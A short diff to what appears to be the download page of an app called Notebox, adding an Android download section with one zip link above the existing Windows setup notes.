@@ -11,6 +11,16 @@
 
 ---
 
+# Android Downloads
+
+    ---
+    
+    **EN**
+
+    [Download](https://bun.filedit.ch/HXevivwDIMvKorcflfxc.zip)
+
+    ---
+
 # Windows Downloads
 
 - Setup (WARNING: If you install the setup over an already installed version of Notebox, you may risk of losing data. Please use the updater.)
